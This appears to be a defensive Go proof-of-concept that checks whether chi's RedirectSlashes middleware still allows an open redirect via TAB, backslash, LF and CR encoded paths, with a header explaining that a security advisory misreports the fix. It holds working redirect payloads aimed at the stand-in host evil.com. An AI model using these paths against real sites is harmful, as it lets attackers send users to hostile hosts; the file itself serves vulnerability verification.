//go:build ignore

// PoC for CVE-2026-122132 (chi middleware.RedirectSlashes open redirect, TAB variant).
//
// Build-tagged `ignore` so it is never part of `go build ./...` or the shipped
// binary: it is a measuring instrument, run deliberately against a chosen chi
// version by the steps below, not code this project compiles.
//
// Why this file exists: GHSA-mqqf-5wvp-8fh8 reports a FALSE `fixed: 5.2.4` because that one
// advisory id covers two CVEs (CVE-2025-69725 backslash, fixed in 5.2.4; CVE-2026-122132 TAB,
// still unfixed) and GitHub kept only the first boundary. A package+version OSV query therefore
// returns CLEAN at any version >= 5.2.4, including the newest tag. Measure, don't trust the range.
//
// Usage (copy OUT of this repo, so it gets its own go.mod and chosen chi version).
// Strip the build tag in the copy -- it exists only to keep this file out of THIS
// module's build, and `go run` would otherwise report "build constraints exclude
// all Go files":
//   mkdir -p /tmp/chi-poc && cd /tmp/chi-poc
//   sed '/^\/\/go:build ignore$/d' scripts/poc/redirectslashes-tab.go > main.go
//   printf 'module poc\ngo 1.23\n' > go.mod
//   go mod edit -require=github.com/go-chi/chi/v5@<VERSION-TO-TEST>
//   GOFLAGS=-mod=mod go mod tidy && GOFLAGS=-mod=mod go run .
//
// Reading the result:
//   FIXED      -> /%09/evil.com/ no longer yields a Location containing a raw TAB.
//   STILL VULN -> Location="/\t/evil.com". Browsers strip the TAB, resolve //evil.com,
//                 and follow it as a protocol-relative URL to the attacker's host.
//
// Last run 2026-11-12: v5.2.3, v5.2.4 and v5.5.0 (newest) are ALL still vulnerable to the TAB
// variant. RedirectSlashes is byte-identical between v5.2.4 and v5.5.0.

package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
)

func main() {
	r := chi.NewRouter()
	r.Use(middleware.RedirectSlashes)
	r.Get("/*", func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) })

	cases := []struct{ path, note string }{
		{`/%5Cevil.com/`, "backslash  (CVE-2025-69725, genuinely fixed in 5.2.4)"},
		{`/%09/evil.com/`, "TAB        (CVE-2026-122132 -- the one to watch)"},
		{`/%09evil.com/`, "TAB, no slash"},
		{`/%0A/evil.com/`, "LF"},
		{`/%0D/evil.com/`, "CR"},
	}
	for _, c := range cases {
		req := httptest.NewRequest("GET", c.path, nil)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)
		fmt.Printf("req %-18s -> %d  Location=%-22q  %s\n",
			c.path, w.Code, w.Header().Get("Location"), c.note)
	}
}
